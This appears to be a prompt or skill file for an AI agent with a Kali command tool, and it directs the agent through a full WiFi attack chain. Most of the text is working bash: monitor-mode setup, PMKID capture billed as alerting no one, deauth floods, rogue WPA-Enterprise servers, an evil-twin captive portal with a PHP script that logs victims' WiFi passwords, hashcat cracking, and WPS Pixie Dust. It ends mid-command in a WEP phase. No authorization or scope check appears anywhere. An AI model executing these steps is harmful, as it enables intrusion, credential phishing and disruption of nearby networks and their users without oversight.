---
description: WiFi attack suite — monitor mode setup, airodump survey, WPA2 handshake capture, PMKID attack (no deauth), hashcat cracking, WPS Pixie Dust, evil twin AP, client deauth, WEP cracking
argument-hint: [interface] (e.g. wlan0 — auto-detects if omitted)
allowed-tools: [mcp__kali-pentest__execute_kali_command]
---

# pt-wifi — WiFi Attack Suite

You are an expert wireless penetration tester. Execute the complete WiFi attack chain: put the wireless interface into monitor mode, survey all nearby networks and clients, capture WPA2 handshakes or PMKID hashes, crack them with hashcat, attack WPS-enabled networks with Pixie Dust, and compromise WiFi clients via evil twin or deauthentication. Think like a human: "I see WPA2-PSK with 3 connected clients → PMKID first (passive, no alert) → handshake deauth as backup → crack with rockyou + rules → connected."

---

## Step 0 — Parse Arguments & Interface Detection

`$ARGUMENTS` = `[interface]`
- If no argument: auto-detect wireless interface

```bash
WLAN_ARG="<argument>"
ENG=/home/kali/current
mkdir -p $ENG/{loot/wifi,scans/wifi,poc/requests} 2>/dev/null

echo "=== pt-wifi — WiFi Attack Suite ==="
echo ""

# Detect wireless interfaces
echo "--- Available wireless interfaces ---"
iw dev 2>/dev/null | grep -A5 "Interface"
echo ""

# Determine which interface to use
if [ -n "$WLAN_ARG" ] && [ "$WLAN_ARG" != "<argument>" ]; then
    WLAN="$WLAN_ARG"
else
    WLAN=$(iw dev 2>/dev/null | grep "Interface" | awk '{print $2}' | head -1)
fi

[ -z "$WLAN" ] && {
    echo "[!] No wireless interface found."
    echo "    If using VirtualBox, you need a USB WiFi adapter passthrough."
    echo "    Check: lsusb | grep -iE 'wireless|wifi|802.11'"
    exit 1
}

echo "Using interface: $WLAN"
DRIVER=$(ethtool -i "$WLAN" 2>/dev/null | grep "driver" | awk '{print $2}')
echo "Driver: $DRIVER"
echo ""

# Check required tools
echo "--- Tool availability ---"
for tool in airmon-ng airodump-ng aireplay-ng aircrack-ng hcxdumptool hcxpcapngtool wash reaver hashcat; do
    which $tool 2>/dev/null && echo "  [+] $tool" || echo "  [-] $tool"
done
echo ""

# Install missing tools if needed
which hcxdumptool 2>/dev/null || {
    echo "Installing hcxdumptool and hcxtools..."
    apt-get install -y hcxdumptool hcxtools 2>/dev/null | tail -3
}
```

---

## Phase 1 — Monitor Mode Setup

```bash
WLAN=<wireless_interface>

echo "=== [Phase 1] Enabling Monitor Mode ==="
echo ""

# Kill interfering processes (NetworkManager, wpa_supplicant)
echo "--- Killing interfering processes ---"
airmon-ng check kill 2>/dev/null | grep -v "^$"

# Enable monitor mode
echo ""
echo "--- Starting monitor mode ---"
airmon-ng start "$WLAN" 2>/dev/null | tail -5

# Detect monitor interface name (usually wlan0mon or wlan0)
MON_IFACE=$(iw dev 2>/dev/null | grep "Interface" | awk '{print $2}' | grep -E "mon|wlan.*mon" | head -1)
[ -z "$MON_IFACE" ] && MON_IFACE="${WLAN}mon"

echo ""
echo "Monitor interface: $MON_IFACE"
iw dev "$MON_IFACE" info 2>/dev/null | grep -E "type|channel|Interface"
echo ""

# Set regulatory domain to maximize channel coverage (optional)
iw reg set US 2>/dev/null
echo "Current regulatory domain: $(iw reg get 2>/dev/null | grep country | head -1)"
```

---

## Phase 2 — Network Survey (Airodump)

Capture all visible networks and their clients:

```bash
MON_IFACE=<monitor_interface>
ENG=/home/kali/current

echo "=== [Phase 2] Network Survey ==="
echo "Scanning for 30 seconds across all channels (2.4GHz + 5GHz)..."
echo ""

# Quick survey — capture all networks and clients
echo "Running airodump-ng survey (30s, all bands)..."
timeout 30 airodump-ng "$MON_IFACE" \
    --band abg \
    --write $ENG/scans/wifi/survey \
    --output-format csv,pcap \
    2>/dev/null

echo ""
echo "--- Networks discovered ---"
# Parse CSV output
if [ -f "$ENG/scans/wifi/survey-01.csv" ]; then
    echo "BSSID             | SIGNAL | CH | ENCRYPTION | ESSID              | CLIENTS"
    echo "------------------|--------|----|-----------|--------------------|--------"
    python3 << 'EOF'
import csv, sys

csv_file = '/home/kali/current/scans/wifi/survey-01.csv'
try:
    with open(csv_file, 'r', errors='replace') as f:
        content = f.read()

    # Split into APs and clients sections
    sections = content.split('\r\n\r\n')
    ap_section = sections[0] if sections else ''
    client_section = sections[1] if len(sections) > 1 else ''

    # Count clients per BSSID
    client_counts = {}
    for line in client_section.split('\n')[1:]:
        parts = [p.strip() for p in line.split(',')]
        if len(parts) >= 6 and parts[0] and parts[5] and parts[5] != '(not associated)':
            bssid = parts[5]
            client_counts[bssid] = client_counts.get(bssid, 0) + 1

    # Print APs
    for line in ap_section.split('\n')[2:]:
        parts = [p.strip() for p in line.split(',')]
        if len(parts) >= 14 and parts[0] and ':' in parts[0]:
            bssid = parts[0]
            signal = parts[8] if len(parts) > 8 else '?'
            channel = parts[3] if len(parts) > 3 else '?'
            enc = parts[5] if len(parts) > 5 else '?'
            essid = parts[13] if len(parts) > 13 else '<hidden>'
            clients = client_counts.get(bssid, 0)
            print(f"  {bssid} | {signal:>6} | {channel:>2} | {enc:>9} | {essid[:18]:<18} | {clients}")
except Exception as e:
    print(f"  Error parsing CSV: {e}")
EOF
fi

echo ""
echo "Survey files → $ENG/scans/wifi/"
```

---

## Phase 3 — Target Selection

Identify the best target based on signal, encryption, and client count:

```bash
ENG=/home/kali/current

echo "=== [Phase 3] Target Selection ==="
echo ""
echo "Best targets (WPA2 with clients, strong signal):"
echo ""
python3 << 'EOF'
import csv

csv_file = '/home/kali/current/scans/wifi/survey-01.csv'
try:
    with open(csv_file, 'r', errors='replace') as f:
        content = f.read()

    sections = content.split('\r\n\r\n')
    ap_section = sections[0] if sections else ''
    client_section = sections[1] if len(sections) > 1 else ''

    client_counts = {}
    clients_by_bssid = {}
    for line in client_section.split('\n')[1:]:
        parts = [p.strip() for p in line.split(',')]
        if len(parts) >= 6 and parts[0] and parts[5] and parts[5] != '(not associated)':
            bssid = parts[5]
            client_mac = parts[0]
            client_counts[bssid] = client_counts.get(bssid, 0) + 1
            clients_by_bssid.setdefault(bssid, []).append(client_mac)

    targets = []
    for line in ap_section.split('\n')[2:]:
        parts = [p.strip() for p in line.split(',')]
        if len(parts) >= 14 and parts[0] and ':' in parts[0]:
            bssid = parts[0]
            try:
                signal = int(parts[8]) if parts[8] else -100
                channel = parts[3].strip()
                enc = parts[5].strip()
                essid = parts[13].strip() if parts[13].strip() else '<hidden>'
                clients = client_counts.get(bssid, 0)
                if 'WPA' in enc or 'WEP' in enc:
                    targets.append((signal, bssid, channel, enc, essid, clients, clients_by_bssid.get(bssid, [])))
            except:
                pass

    targets.sort(reverse=True)
    for i, (sig, bssid, ch, enc, essid, clients, macs) in enumerate(targets[:10]):
        attack = 'PMKID+Handshake' if 'WPA2' in enc else 'WPS-Pixie' if 'WPS' in enc else 'WEP-ARP'
        print(f"  [{i+1}] {essid:<20} BSSID:{bssid} CH:{ch:>3} Signal:{sig} Enc:{enc} Clients:{clients}")
        print(f"       Attack: {attack}")
        if macs:
            print(f"       Client MACs: {', '.join(macs[:3])}")
        print()
except Exception as e:
    print(f"Error: {e}")
    print("Set TARGET_BSSID, TARGET_CHANNEL, TARGET_ESSID manually from survey output above.")
EOF

echo ""
echo "Set these variables for Phase 4:"
echo "  TARGET_BSSID=<bssid_from_above>"
echo "  TARGET_CHANNEL=<channel>"
echo "  TARGET_ESSID=<network_name>"
echo "  CLIENT_MAC=<client_mac_if_visible>"
```

---

## Phase 4a — PMKID Attack (Passive, No Deauth)

Capture the PMKID without deauthenticating any clients — stealthy and reliable:

```bash
MON_IFACE=<monitor_interface>
TARGET_BSSID=<target_bssid>
TARGET_CHANNEL=<channel>
TARGET_ESSID=<essid>
ENG=/home/kali/current

echo "=== [Phase 4a] PMKID Attack (passive — no deauth needed) ==="
echo "Target: $TARGET_ESSID ($TARGET_BSSID) on channel $TARGET_CHANNEL"
echo ""

# Set channel
iw dev "$MON_IFACE" set channel "$TARGET_CHANNEL" 2>/dev/null

# Capture PMKID (modern WPA2 access points broadcast PMKID in first EAPOL frame)
echo "Running hcxdumptool (60 seconds)..."
echo "PMKID is passively captured — no deauth, no alerts to users."
timeout 60 hcxdumptool \
    -i "$MON_IFACE" \
    -o "$ENG/loot/wifi/pmkid_${TARGET_BSSID//:/_}.pcapng" \
    --enable_status=3 \
    --filterlist_ap="$ENG/loot/wifi/target_filter.txt" \
    --filtermode=2 \
    2>/dev/null | grep -E "FOUND|found|PMKID|CLIENT" | head -20

echo ""
echo "Converting PMKID capture to hashcat format..."
hcxpcapngtool \
    "$ENG/loot/wifi/pmkid_${TARGET_BSSID//:/_}.pcapng" \
    -o "$ENG/loot/wifi/hash_${TARGET_BSSID//:/_}.hc22000" \
    2>/dev/null | tail -5

HASH_LINES=$(wc -l < "$ENG/loot/wifi/hash_${TARGET_BSSID//:/_}.hc22000" 2>/dev/null || echo 0)
echo "Hashes captured: $HASH_LINES"
[ "$HASH_LINES" -gt "0" ] && echo "[+] PMKID captured! Proceed to Phase 5 (cracking)" || \
    echo "[-] No PMKID captured. Proceed to Phase 4b (handshake capture with deauth)"
```

---

## Phase 4b — WPA2 Handshake Capture (Deauth Attack)

Force clients to reconnect and capture the 4-way handshake:

```bash
MON_IFACE=<monitor_interface>
TARGET_BSSID=<target_bssid>
TARGET_CHANNEL=<channel>
TARGET_ESSID=<essid>
CLIENT_MAC=<client_mac_or_FF:FF:FF:FF:FF:FF>
ENG=/home/kali/current

echo "=== [Phase 4b] WPA2 Handshake Capture ==="
echo "Target: $TARGET_ESSID ($TARGET_BSSID) Channel: $TARGET_CHANNEL"
echo ""

# Start capture focused on target network
echo "Starting targeted capture on channel $TARGET_CHANNEL..."
airodump-ng \
    -c "$TARGET_CHANNEL" \
    --bssid "$TARGET_BSSID" \
    -w "$ENG/loot/wifi/handshake_${TARGET_BSSID//:/_}" \
    --output-format pcap \
    "$MON_IFACE" 2>/dev/null &

AIRODUMP_PID=$!
echo "airodump-ng PID: $AIRODUMP_PID"
echo ""

# Wait for capture to stabilize
sleep 3

# Send deauth frames to force client reconnection (triggers handshake)
echo "Sending deauthentication frames (5 bursts)..."
echo "  Deauthing all clients: aireplay-ng -0 5 -a $TARGET_BSSID $MON_IFACE"
aireplay-ng -0 5 -a "$TARGET_BSSID" "$MON_IFACE" 2>/dev/null | tail -5

# If specific client known, target them directly
if [ "$CLIENT_MAC" != "FF:FF:FF:FF:FF:FF" ] && [ -n "$CLIENT_MAC" ]; then
    echo "  Deauthing specific client: $CLIENT_MAC"
    aireplay-ng -0 5 -a "$TARGET_BSSID" -c "$CLIENT_MAC" "$MON_IFACE" 2>/dev/null | tail -5
fi

# Wait for handshake
sleep 10
echo ""

# Check for handshake in capture file
CAPTURE=$(ls "$ENG/loot/wifi/handshake_${TARGET_BSSID//:/_}"*.cap 2>/dev/null | head -1)
if [ -n "$CAPTURE" ]; then
    aircrack-ng "$CAPTURE" 2>/dev/null | grep -iE "handshake|WPA|found" | head -5
    HANDSHAKE=$(aircrack-ng "$CAPTURE" 2>/dev/null | grep -c "handshake\|WPA" || echo 0)
    [ "$HANDSHAKE" -gt "0" ] && echo "[+] Handshake captured in $CAPTURE" || {
        echo "[-] No handshake yet. Sending more deauth frames..."
        aireplay-ng -0 10 -a "$TARGET_BSSID" "$MON_IFACE" 2>/dev/null | tail -3
        sleep 15
        aircrack-ng "$CAPTURE" 2>/dev/null | grep -iE "handshake|WPA" | head -3
    }
fi

kill $AIRODUMP_PID 2>/dev/null

# Convert to hashcat format
hcxpcapngtool "$CAPTURE" \
    -o "$ENG/loot/wifi/hash_${TARGET_BSSID//:/_}.hc22000" 2>/dev/null | tail -3
echo "Hash file → $ENG/loot/wifi/hash_${TARGET_BSSID//:/_}.hc22000"
```

---

## Phase 4c — WPA2-Enterprise (EAP) Attack

Corporate networks using 802.1X EAP authentication require a different attack:
Reconnaissance shows `MGT` in the auth column of airodump instead of `PSK`.

```bash
MON_IFACE=<monitor_interface>
WLAN=<original_interface>
TARGET_ESSID=<essid>
TARGET_BSSID=<target_bssid>
TARGET_CHANNEL=<channel>
ENG=/home/kali/current

echo "=== [Phase 4c] WPA2-Enterprise (EAP) Attack ==="
echo "Check survey output: if AUTH column shows 'MGT' instead of 'PSK' → this phase applies"
echo ""

# Check if target uses WPA-Enterprise
grep "$TARGET_BSSID" $ENG/scans/wifi/survey-01.csv 2>/dev/null | grep -qi "MGT\|EAP" && \
    echo "[!] WPA2-Enterprise confirmed for $TARGET_ESSID" || \
    echo "[?] Auth type uncertain — proceed anyway if corporate network suspected"

echo ""
echo "--- hostapd-wpe (rogue RADIUS server — captures MSCHAPv2 challenges) ---"
# hostapd-wpe is patched hostapd that logs EAP credentials
which hostapd-wpe 2>/dev/null && HOSTAPD_WPE="hostapd-wpe" || \
    HOSTAPD_WPE="/usr/sbin/hostapd-wpe"

cat > /tmp/hostapd_wpe.conf << EOF
interface=$MON_IFACE
ssid=$TARGET_ESSID
channel=$TARGET_CHANNEL
hw_mode=g
ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
private_key_passwd=whatever
dh_file=/etc/hostapd-wpe/certs/dh
eap_fast_a_id=101112131415161718191a1b1c1d1e1f
eap_fast_a_id_info=hostapd-wpe
eap_fast_prov=3
pac_key_lifetime=604800
pac_key_refresh_time=86400
EOF

$HOSTAPD_WPE /tmp/hostapd_wpe.conf 2>/dev/null | \
    tee $ENG/loot/wifi/wpe_captures.txt | \
    grep -E "MSCHAPv2|challenge|response|identity|username|mschapv2" &

WPE_PID=$!
echo "Rogue EAP server running (PID $WPE_PID)"
echo "Clients connecting to '$TARGET_ESSID' will leak MSCHAPv2 challenge/response"
echo ""
echo "Deauth clients from real AP to force reconnection to rogue:"
echo "  aireplay-ng -0 3 -a $TARGET_BSSID $MON_IFACE"
echo ""
sleep 10
echo ""
echo "Captured EAP credentials → $ENG/loot/wifi/wpe_captures.txt"
grep -E "MSCHAPv2|challenge|response|identity" $ENG/loot/wifi/wpe_captures.txt 2>/dev/null | head -10
echo ""
echo "--- Cracking MSCHAPv2 ---"
echo "1. asleap (fastest for NTLMv1-based MSCHAPv2):"
echo "   asleap -C <challenge> -R <response> -W /usr/share/wordlists/rockyou.txt"
echo ""
echo "2. hashcat mode 5500 (NTLMv1) or 5600 (NTLMv2):"
echo "   hashcat -m 5500 '<username>::<domain>:<challenge>:<response>' rockyou.txt -r best64.rule"
echo ""
echo "3. If MSCHAPv2 cracked → NT hash = domain credential → Pass-the-Hash:"
echo "   netexec smb <dc-ip> -u <username> -H <nt_hash>"
echo ""
echo "--- Alternative: eaphammer (full EAP attack framework) ---"
[ -d /opt/eaphammer ] || echo "Install: git clone https://github.com/s0lst1c3/eaphammer /opt/eaphammer && cd /opt/eaphammer && ./kali-setup"
echo "Run: python3 /opt/eaphammer/eaphammer.py -i $MON_IFACE --channel $TARGET_CHANNEL --auth wpa-eap --essid $TARGET_ESSID --creds --hostile-portal"
```

---

## Phase 4d — WPA3 / KRACK Attack

```bash
MON_IFACE=<monitor_interface>
TARGET_BSSID=<target_bssid>
TARGET_ESSID=<essid>
TARGET_CHANNEL=<channel>
ENG=/home/kali/current

echo "=== [Phase 4d] WPA3 Dragonblood + KRACK ==="
echo ""

# Check if WPA3 (SAE handshake)
echo "--- WPA3 SAE detection ---"
grep "$TARGET_BSSID" $ENG/scans/wifi/survey-01.csv 2>/dev/null | grep -qi "SAE" && {
    echo "[!] WPA3 SAE network: $TARGET_ESSID"
    echo ""
    echo "WPA3 Dragonblood CVE-2019-9494/9496 — side-channel attacks on SAE handshake"
    echo ""
    echo "Dragonslayer attack (cache-based side-channel timing):"
    [ -d /opt/dragonslayer ] && \
        python3 /opt/dragonslayer/dragonslayer.py -i "$MON_IFACE" -b "$TARGET_BSSID" 2>/dev/null | head -20 || {
        echo "  Install: git clone https://github.com/vanhoefm/dragonslayer /opt/dragonslayer"
        echo "  Run: python3 /opt/dragonslayer/dragonslayer.py -i $MON_IFACE -b $TARGET_BSSID"
    }
    echo ""
    echo "WPA3-Transition mode bypass (if AP supports both WPA2 and WPA3):"
    echo "  Many WPA3 APs advertise both for backward compat — attack the WPA2 side:"
    echo "  Force client to use WPA2: deauth client while broadcasting WPA2-only AP (evil twin without WPA3)"
    echo "  Evil twin: modify /tmp/evil_twin.conf to set wpa=2 (not wpa=6) → clients fall back to WPA2"
} || echo "  Target does not use WPA3 SAE — skip this phase"

echo ""
echo "--- KRACK CVE-2017-13077 (key reinstallation) ---"
echo "KRACK affects unpatched clients (Android 6/7, Linux wpa_supplicant < 2.7)"
echo "The attack forces key reinstallation during 4-way handshake (nonce reuse → decrypt)"
echo ""
echo "krackattacks test script:"
[ -d /opt/krackattacks ] && \
    echo "  python3 /opt/krackattacks/krack-test-client.py --interface=$MON_IFACE" || {
    echo "  Install: git clone https://github.com/vanhoefm/krackattacks-scripts /opt/krackattacks"
    echo "  pip3 install -r /opt/krackattacks/requirements.txt"
    echo "  python3 /opt/krackattacks/krack-test-client.py --interface=$MON_IFACE"
}
echo ""
echo "KRACK result: if vulnerable, attacker can decrypt/replay/forge packets even on WPA2-PSK"
echo "Most patched systems (post-2018) are not vulnerable to KRACK."
echo ""
echo "--- PMF / 802.11w awareness ---"
echo "If deauth attacks consistently fail, AP has Protected Management Frames enabled."
echo "PMF makes deauth/disassoc frames cryptographically signed — unauthenticated deauth is dropped."
echo ""
echo "PMF workarounds:"
echo "  1. PMKID attack (Phase 4a) — passive, NO deauth needed — use this instead"
echo "  2. Broadcast deauth (different multicast frame, sometimes bypasses PMF in optional mode)"
echo "     aireplay-ng -0 5 -a $TARGET_BSSID $MON_IFACE  (without -c = broadcast)"
echo "  3. KRACK against unpatched clients (doesn't need deauth)"
echo "  4. Evil twin with stronger signal (clients prefer signal strength over PMF)"
echo ""
echo "--- Hidden SSID discovery ---"
echo "Some APs suppress SSID broadcast — clients broadcast probes to find their networks."
echo "Deauthing a client from a hidden AP forces it to send probe requests with the SSID."
echo ""
timeout 30 airodump-ng "$MON_IFACE" --output-format csv -w /tmp/hidden_probe 2>/dev/null &
AIRODUMP_PID=$!
sleep 5
# Deauth all clients from target (hidden SSID probes will reveal it)
aireplay-ng -0 3 -a "$TARGET_BSSID" "$MON_IFACE" 2>/dev/null | grep -v "^$" | head -3
sleep 20
kill $AIRODUMP_PID 2>/dev/null
echo "Probe requests captured. Checking for hidden SSIDs..."
grep -v "^Station\|^BSSID\|^$" /tmp/hidden_probe-01.csv 2>/dev/null | \
    awk -F',' '{print $7}' | grep -v "not associated\|^$" | sort -u | \
    while read ssid; do echo "  Hidden SSID found via probe: '$ssid'"; done
```

---

## Phase 5 — Hashcat WPA2 Cracking

Crack the captured PMKID or handshake hash:

```bash
TARGET_BSSID=<target_bssid>
TARGET_ESSID=<essid>
ENG=/home/kali/current

echo "=== [Phase 5] WPA2 Hash Cracking ==="
echo ""

HASH_FILE="$ENG/loot/wifi/hash_${TARGET_BSSID//:/_}.hc22000"

[ ! -f "$HASH_FILE" ] && {
    echo "[!] Hash file not found: $HASH_FILE"
    echo "    Check: ls $ENG/loot/wifi/*.hc22000"
    exit 1
}

echo "Hash file: $HASH_FILE"
echo "Hash lines: $(wc -l < $HASH_FILE)"
echo ""

# Phase 5.1: Dictionary attack with rules (fastest, highest success rate)
echo "--- Round 1: rockyou.txt + best64.rule ---"
hashcat -m 22000 "$HASH_FILE" \
    /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule \
    --potfile-path "$ENG/loot/wifi/hashcat.pot" \
    -o "$ENG/loot/wifi/cracked_${TARGET_BSSID//:/_}.txt" \
    --status --status-timer=30 \
    -w 3 2>/dev/null | tail -15

CRACKED=$(cat "$ENG/loot/wifi/cracked_${TARGET_BSSID//:/_}.txt" 2>/dev/null | grep -v "^$" | wc -l)
if [ "$CRACKED" -gt "0" ]; then
    echo ""
    echo "[+] PASSWORD CRACKED!"
    cat "$ENG/loot/wifi/cracked_${TARGET_BSSID//:/_}.txt"
else
    echo ""
    echo "--- Round 2: WiFi-specific wordlists ---"
    # Common WiFi password patterns
    cat > /tmp/wifi_rules.rule << 'EOF'
:
u
l
c
$1
$2
$!
$@
$#
$123
$1234
$12345
$123456
l$1
l$12
l$123
EOF
    [ -f /usr/share/wordlists/seclists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt ] && \
    hashcat -m 22000 "$HASH_FILE" \
        /usr/share/wordlists/seclists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt \
        -r /tmp/wifi_rules.rule \
        --potfile-path "$ENG/loot/wifi/hashcat.pot" \
        -o "$ENG/loot/wifi/cracked_${TARGET_BSSID//:/_}.txt" \
        -w 3 2>/dev/null | tail -10

    echo ""
    echo "--- Round 3: ESSID-based passwords (network name as base) ---"
    python3 << PYEOF
import itertools
essid = "$TARGET_ESSID"
# Generate ESSID-based passwords
candidates = [
    essid, essid.lower(), essid.upper(),
    essid + "123", essid + "1234", essid + "12345", essid + "2024", essid + "2025",
    essid + "!", essid + "@", essid + "#",
    essid.lower() + "123", essid.lower() + "1234",
    "admin", "password", "12345678", "87654321",
    essid * 2, essid[::-1],
]
with open('/tmp/essid_wordlist.txt', 'w') as f:
    for p in candidates:
        if 8 <= len(p) <= 63:  # WPA2 PSK constraints
            f.write(p + '\n')
print(f"Generated {len(candidates)} ESSID-based candidates")
PYEOF
    hashcat -m 22000 "$HASH_FILE" /tmp/essid_wordlist.txt \
        --potfile-path "$ENG/loot/wifi/hashcat.pot" \
        -o "$ENG/loot/wifi/cracked_${TARGET_BSSID//:/_}.txt" \
        -w 3 2>/dev/null | tail -5

    CRACKED=$(cat "$ENG/loot/wifi/cracked_${TARGET_BSSID//:/_}.txt" 2>/dev/null | grep -v "^$" | wc -l)
    if [ "$CRACKED" -gt "0" ]; then
        echo "[+] CRACKED: $(cat $ENG/loot/wifi/cracked_${TARGET_BSSID//:/_}.txt)"
    else
        echo "[-] Not cracked with wordlists. Trying mask attacks..."

        echo "--- Round 4: 8-digit numeric mask (ISP default format) ---"
        hashcat -m 22000 "$HASH_FILE" \
            -a 3 '?d?d?d?d?d?d?d?d' \
            --potfile-path "$ENG/loot/wifi/hashcat.pot" \
            -o "$ENG/loot/wifi/cracked_${TARGET_BSSID//:/_}.txt" \
            -w 3 2>/dev/null | tail -5

        echo "--- Round 5: ESSID prefix + 4-digit suffix (telecom default pattern) ---"
        # Many ISP routers use first 6 chars of SSID + 4 digits
        ESSID_PREFIX="${TARGET_ESSID:0:6}"
        for suffix_mask in '?d?d?d?d' '?d?d?d?d?d?d' '?u?u?u?u?d?d?d?d'; do
            hashcat -m 22000 "$HASH_FILE" \
                -a 3 "${ESSID_PREFIX}${suffix_mask}" \
                --potfile-path "$ENG/loot/wifi/hashcat.pot" \
                -o "$ENG/loot/wifi/cracked_${TARGET_BSSID//:/_}.txt" \
                -w 3 2>/dev/null | tail -3
        done

        echo "--- Round 6: 10-digit phone number pattern ---"
        hashcat -m 22000 "$HASH_FILE" \
            -a 3 '?d?d?d?d?d?d?d?d?d?d' \
            --potfile-path "$ENG/loot/wifi/hashcat.pot" \
            -o "$ENG/loot/wifi/cracked_${TARGET_BSSID//:/_}.txt" \
            -w 3 2>/dev/null | tail -3

        echo "--- Round 7: Upper+Lower+Digit combinator (8-10 char mixed) ---"
        # Common pattern: FirstnameYYYY, CompanyName123!, etc.
        hashcat -m 22000 "$HASH_FILE" \
            -a 3 '?u?l?l?l?l?d?d?d?d' \
            --potfile-path "$ENG/loot/wifi/hashcat.pot" \
            -o "$ENG/loot/wifi/cracked_${TARGET_BSSID//:/_}.txt" \
            -w 3 2>/dev/null | tail -3
        hashcat -m 22000 "$HASH_FILE" \
            -a 3 '?u?l?l?l?l?l?d?d?d' \
            --potfile-path "$ENG/loot/wifi/hashcat.pot" \
            -o "$ENG/loot/wifi/cracked_${TARGET_BSSID//:/_}.txt" \
            -w 3 2>/dev/null | tail -3

        CRACKED=$(cat "$ENG/loot/wifi/cracked_${TARGET_BSSID//:/_}.txt" 2>/dev/null | grep -v "^$" | wc -l)
        [ "$CRACKED" -gt "0" ] && echo "[+] CRACKED via mask: $(cat $ENG/loot/wifi/cracked_${TARGET_BSSID//:/_}.txt)" || \
            echo "[-] Not cracked. Consider: custom OSINT wordlist, combinator attack, or GPU rental."
    fi
fi

echo ""
echo "Cracked results → $ENG/loot/wifi/cracked_${TARGET_BSSID//:/_}.txt"
```

---

## Phase 6 — WPS Pixie Dust Attack

Many routers still have WPS enabled — exploit the Pixie Dust vulnerability for instant PIN recovery:

```bash
MON_IFACE=<monitor_interface>
TARGET_BSSID=<target_bssid>
TARGET_CHANNEL=<channel>
ENG=/home/kali/current

echo "=== [Phase 6] WPS Attack ==="
echo ""

# Detect WPS-enabled networks
echo "--- Scanning for WPS-enabled networks ---"
timeout 20 wash -i "$MON_IFACE" 2>/dev/null | \
    grep -v "^Signa\|^---\|^$" | tee $ENG/scans/wifi/wps_targets.txt | head -20

WPS_FOUND=$(grep -c "$TARGET_BSSID" $ENG/scans/wifi/wps_targets.txt 2>/dev/null || echo 0)

if [ "$WPS_FOUND" -gt "0" ]; then
    WPS_LOCKED=$(grep "$TARGET_BSSID" $ENG/scans/wifi/wps_targets.txt | awk '{print $5}')
    echo "Target WPS status: $WPS_LOCKED"

    if [ "$WPS_LOCKED" = "No" ] || [ "$WPS_LOCKED" = "0" ]; then
        echo ""
        echo "--- WPS Pixie Dust attack (reaver) ---"
        echo "Pixie Dust recovers the WPS PIN from leaked DH keys (seconds on vulnerable routers)"
        reaver \
            -i "$MON_IFACE" \
            -b "$TARGET_BSSID" \
            -c "$TARGET_CHANNEL" \
            -K 1 \
            -v \
            -f \
            -d 1 \
            -t 5 \
            2>/dev/null | tee $ENG/loot/wifi/wps_reaver.txt | \
            grep -E "PIN|Password|WPA PSK|success|failed" | head -10
    else
        echo "WPS is locked on this AP — PIN brute force would trigger lockout."
        echo "Try Pixie Dust anyway (doesn't trigger lockout): reaver -i $MON_IFACE -b $TARGET_BSSID -K 1"
    fi
else
    echo "Target BSSID not found in WPS scan. WPS may be disabled."
fi
```

---

## Phase 7 — Evil Twin AP (Credential Harvest without Cracking)

Set up a rogue AP with the same SSID to trick clients into connecting and entering their PSK:

```bash
WLAN=<original_interface>
MON_IFACE=<monitor_interface>
TARGET_ESSID=<essid>
TARGET_BSSID=<target_bssid>
TARGET_CHANNEL=<channel>
KALI_IP=192.168.100.1
ENG=/home/kali/current

echo "=== [Phase 7] Evil Twin AP ==="
echo "Creating rogue AP: $TARGET_ESSID on channel $TARGET_CHANNEL"
echo ""

# Check for second wireless interface or ethernet for uplink
echo "Available interfaces:"
ip link show | grep -E "^[0-9]+" | awk '{print "  "$2}'
echo ""

# Create hostapd config
cat > /tmp/evil_twin.conf << EOF
interface=$WLAN
driver=nl80211
ssid=$TARGET_ESSID
hw_mode=g
channel=$TARGET_CHANNEL
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
EOF

# Configure DHCP
cat > /tmp/dnsmasq_evil.conf << EOF
interface=$WLAN
dhcp-range=$KALI_IP,192.168.100.200,255.255.255.0,12h
dhcp-option=3,$KALI_IP
dhcp-option=6,$KALI_IP
server=8.8.8.8
log-queries
address=/#/$KALI_IP
EOF

# Configure Kali's wlan interface
ip addr add $KALI_IP/24 dev "$WLAN" 2>/dev/null
ip link set "$WLAN" up

# Start hostapd in background
echo "Starting evil twin AP..."
hostapd /tmp/evil_twin.conf 2>/dev/null &
sleep 3

# Start DHCP
dnsmasq -C /tmp/dnsmasq_evil.conf 2>/dev/null &

# Set up captive portal (simple credential capture page)
mkdir -p /var/www/html/
cat > /var/www/html/index.html << HTMLEOF
<!DOCTYPE html><html><head><title>WiFi Login Required</title>
<style>body{font-family:Arial;text-align:center;margin:50px}
input{width:250px;padding:10px;margin:5px;font-size:16px}
button{background:#007bff;color:white;padding:10px 30px;font-size:16px;border:none;cursor:pointer}</style>
</head><body>
<h2>Network Authentication Required</h2>
<p>Enter your WiFi password to continue:</p>
<form method="POST" action="/capture.php">
  <input type="text" name="essid" value="$TARGET_ESSID" readonly><br>
  <input type="password" name="psk" placeholder="WiFi Password" required><br><br>
  <button type="submit">Connect</button>
</form></body></html>
HTMLEOF

# Credential capture script
cat > /var/www/html/capture.php << 'PHPEOF'
<?php
$psk = $_POST['psk'] ?? '';
$essid = $_POST['essid'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'];
file_put_contents('/home/kali/current/loot/wifi/evil_twin_creds.txt',
    date('Y-m-d H:i:s') . " | IP: $ip | ESSID: $essid | PSK: $psk\n",
    FILE_APPEND);
header('Location: http://google.com');
?>
PHPEOF

# Start web server for captive portal
systemctl start apache2 2>/dev/null || php -S 0.0.0.0:80 -t /var/www/html/ 2>/dev/null &

echo "Evil twin running: SSID='$TARGET_ESSID'"
echo "Captive portal: http://$KALI_IP/"
echo ""
echo "Deauth clients from real AP to force them to connect to evil twin:"
echo "  aireplay-ng -0 0 -a $TARGET_BSSID $MON_IFACE  (continuous deauth)"
echo ""
echo "Monitoring for captured credentials:"
echo "  tail -f $ENG/loot/wifi/evil_twin_creds.txt"
tail -f $ENG/loot/wifi/evil_twin_creds.txt 2>/dev/null &
```

---

## Phase 8 — WEP Cracking (Legacy Networks)

```bash
MON_IFACE=<monitor_interface>
TARGET_BSSID=<target_bssid>
TARGET_CHANNEL=<channel>
ENG=/home/kali/current

echo "=== [Phase 8] WEP Cracking ==="
echo "WEP is cryptographically broken — crackable in minutes with enough IVs."
echo ""

# Start capture
airodump-ng -c "$TARGET_CHANNEL" --bssid "$TARGET_BSSID" \
